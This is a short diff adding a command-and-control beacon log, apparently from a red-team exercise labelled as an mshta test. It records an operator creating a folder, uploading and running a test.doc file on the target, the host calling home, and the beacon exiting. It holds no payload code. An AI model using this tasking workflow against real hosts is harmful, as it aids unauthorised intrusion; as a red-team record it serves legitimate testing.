@@ -1,0 +1,10 @@
+03/03 11:23:58 [task] 4************mshta测试*************
+03/03 11:23:58 [task] Tasked beacon to make directory c:\RedTeam\
+03/03 11:23:58 [task] cd c:\RedTeam\
+03/03 11:23:58 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\test.doc as test.doc
+03/03 11:23:58 [indicator] file: 1289db29cd5da56e26ffd8c45b1d2f38 8586 bytes test.doc
+03/03 11:23:58 [task] cd c:\RedTeam\
+03/03 11:23:58 [task] Tasked beacon to run: test.doc
+03/03 11:24:38 [checkin] host called home, sent: 8702 bytes
+03/03 16:23:59 [input] <neo> exit
+03/03 16:23:59 [task] Tasked beacon to exit
